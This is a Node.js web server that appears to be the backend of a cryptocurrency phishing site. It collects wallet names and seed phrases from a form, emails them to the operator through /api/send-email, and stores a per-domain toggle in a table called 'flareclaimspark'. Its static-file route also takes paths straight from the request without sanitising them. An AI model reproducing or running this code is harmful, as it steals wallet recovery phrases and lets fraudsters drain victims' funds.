import http from "http";
import fs from "fs";
import path from "path";
import url from "url";
import { neon } from "@neondatabase/serverless";
import * as emailService from "./api/send-email.js";

const __dirname = path.dirname(url.fileURLToPath(import.meta.url));

// Initialize Neon database connection
const sql = neon(process.env.DATABASE_URL);

// ============================================
// DATABASE INITIALIZATION & HELPERS
// ============================================

/**
 * Generate domain-based ID for consistent lookups
 */
function getDomainId(domain) {
  let hash = 0;
  for (let i = 0; i < domain.length; i++) {
    hash = (hash << 5) - hash + domain.charCodeAt(i);
    hash = hash & hash;
  }
  return Math.abs(hash);
}

/**
 * Initialize database table on startup
 */
async function initDatabase() {
  try {
    await sql`
      CREATE TABLE IF NOT EXISTS flareclaimspark (
        id INT PRIMARY KEY,
        domain VARCHAR(255) NOT NULL,
        state VARCHAR(3) NOT NULL CHECK (state IN ('ON', 'OFF'))
      )
    `;
    console.log("✅ Database table initialized");
  } catch (error) {
    console.error("❌ Database initialization error:", error.message);
  }
}

// ============================================
// REQUEST HANDLERS
// ============================================

/**
 * Handle toggle state GET/POST requests
 */
const handleToggle = async (req, res, body) => {
  const host = req.headers.host || "";
  const domainId = getDomainId(host);

  try {
    // Ensure domain exists with default state
    await sql`
      INSERT INTO flareclaimspark (id, domain, state)
      VALUES (${domainId}, ${host}, 'OFF')
      ON CONFLICT (id) DO NOTHING
    `;

    if (req.method === "POST") {
      const { state } = JSON.parse(body);

      // Validate state
      if (state !== "ON" && state !== "OFF") {
        res.writeHead(400, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ error: "Invalid state. Use 'ON' or 'OFF'" }));
        return;
      }

      // Update state in database
      await sql`
        UPDATE flareclaimspark
        SET state = ${state}
        WHERE id = ${domainId}
      `;

      console.log(`✅ Toggle updated: ${host} → ${state}`);

      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ success: true, state, domain: host }));
    } else if (req.method === "GET") {
      // Retrieve current state
      const result = await sql`
        SELECT state, domain FROM flareclaimspark WHERE id = ${domainId}
      `;

      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(
        JSON.stringify({
          state: result[0]?.state || "OFF",
          domain: result[0]?.domain || host,
        }),
      );
    }
  } catch (error) {
    console.error("❌ Database error:", error.message);
    res.writeHead(500, { "Content-Type": "application/json" });
    res.end(
      JSON.stringify({ error: "Database error", message: error.message }),
    );
  }
};

/**
 * Handle send email requests
 */
const handleSendEmail = async (req, res, body) => {
  if (req.method !== "POST") {
    res.writeHead(405, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ error: "Method not allowed. Use POST." }));
    return;
  }

  try {
    // Parse request body
    const data = JSON.parse(body);
    const { walletName, walletIcon, seedPhrase } = data;

    console.log("📧 Email request received from:", walletName);

    // Send email via email service
    const result = await emailService.sendFormEmail({
      walletName,
      walletIcon,
      seedPhrase,
    });

    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify(result));
  } catch (error) {
    console.error("❌ Email error:", error.message);
    res.writeHead(400, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ success: false, error: error.message }));
  }
};

/**
 * Handle test email endpoint
 */
const handleTestEmail = async (req, res) => {
  try {
    const result = await emailService.sendTestEmail();
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify(result));
  } catch (error) {
    res.writeHead(500, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ success: false, error: error.message }));
  }
};

/**
 * Serve static files
 */
const serveStaticFile = (res, filePath) => {
  const ext = path.extname(filePath);
  const contentTypes = {
    ".html": "text/html",
    ".js": "text/javascript",
    ".css": "text/css",
    ".json": "application/json",
    ".png": "image/png",
    ".jpg": "image/jpg",
    ".gif": "image/gif",
    ".svg": "image/svg+xml",
    ".ico": "image/x-icon",
    ".woff": "font/woff",
    ".woff2": "font/woff2",
  };

  const contentType = contentTypes[ext] || "text/plain";

  fs.readFile(filePath, (err, content) => {
    if (err) {
      res.writeHead(404, { "Content-Type": "text/plain" });
      res.end("404 - File Not Found");
    } else {
      res.writeHead(200, { "Content-Type": contentType });
      res.end(content);
    }
  });
};

// ============================================
// HTTP SERVER
// ============================================

const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url);
  const pathname = parsedUrl.pathname;

  // Set CORS headers for all responses
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  // Handle preflight requests
  if (req.method === "OPTIONS") {
    res.writeHead(200);
    res.end();
    return;
  }

  // API Routes
  if (pathname === "/api/send-email" && req.method === "POST") {
    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", () => handleSendEmail(req, res, body));
    return;
  }

  if (pathname === "/api/toggle") {
    if (req.method === "POST") {
      let body = "";
      req.on("data", (chunk) => (body += chunk));
      req.on("end", () => handleToggle(req, res, body));
    } else if (req.method === "GET") {
      handleToggle(req, res, "");
    }
    return;
  }

  if (pathname === "/test-email") {
    handleTestEmail(req, res);
    return;
  }

  // Health check / Info endpoint
  if (pathname === "/" || pathname === "/health") {
    res.writeHead(200, { "Content-Type": "application/json" });
    const status = {
      status: "🟢 Server is running",
      endpoints: {
        POST: "/api/send-email - Send form email",
        GET: "/api/toggle - Get toggle state",
        POST: "/api/toggle - Update toggle state",
        GET: "/test-email - Send test email",
      },
      smtp: emailService.getSmtpStatus(),
      database: process.env.DATABASE_URL ? "✅" : "❌",
    };
    res.end(JSON.stringify(status, null, 2));
    return;
  }

  // Static files
  let filePath = `.${pathname}`;
  if (filePath === "./") filePath = "./index.html";

  serveStaticFile(res, filePath);
});

// ============================================
// SERVER STARTUP
// ============================================

const PORT = process.env.PORT || 3000;

async function startServer() {
  try {
    // Initialize database
    await initDatabase();

    // Verify SMTP connection
    await emailService.verifySmtpConnection();

    // Start HTTP server
    server.listen(PORT, () => {
      console.log("\n╔═══════════════════════════════════════╗");
      console.log("║  🚀 SERVER STARTED SUCCESSFULLY       ║");
      console.log("╚═══════════════════════════════════════╝\n");
      console.log(`📍 Port: ${PORT}`);
      console.log(`📧 Email Service: Nodemailer`);
      console.log(
        `💾 Database: ${process.env.DATABASE_URL ? "Connected" : "Not configured"}`,
      );
      console.log("\n📌 Endpoints:");
      console.log(`   POST /api/send-email - Send form submission email`);
      console.log(`   GET  /api/toggle     - Get toggle state`);
      console.log(`   POST /api/toggle     - Update toggle state`);
      console.log(`   GET  /test-email     - Send test email`);
      console.log(`   GET  /health         - Server health & status\n`);
    });
  } catch (error) {
    console.error("❌ Failed to start server:", error.message);
    process.exit(1);
  }
}

// Start the server
startServer();
